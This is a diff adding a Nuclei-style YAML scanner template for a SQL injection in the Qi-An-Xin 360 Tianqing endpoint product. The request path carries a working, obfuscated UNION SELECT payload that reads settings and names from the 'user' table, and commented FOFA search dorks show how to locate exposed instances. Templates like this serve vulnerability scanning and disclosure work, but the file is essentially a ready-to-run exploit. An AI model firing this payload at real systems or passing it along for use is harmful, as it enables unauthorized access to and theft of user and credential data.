@@ -1,0 +1,27 @@
+id: 3360-xintianqing-task-index-sql-leak
+
+info:
+  name: 奇安信360天擎getsimilarlistSQL注入漏洞
+  author: Ashro
+  description: 奇安信360天擎getsimilarlistSQL注入漏洞中，/task/index/detail?id={item.id}存在sql注入。
+  reference:
+    - https://example.com/reference-to-vulnerability
+  severity: high
+  tags: info-leak
+#fofa
+#body="/task/index/detail?id={item.id}"
+#title="360新天擎"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/client/getsimilarlist?status[0,1%29+union+all+select+%28%2F%2A%2150000select%2A%2F+79787337%29%2C+setting%2C+setting%2C+status%2C+name%2C+create_time+from+%22user%22+where+1+in+%281]=1&status[0]=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+      - type: status
+        status:
+          - 200
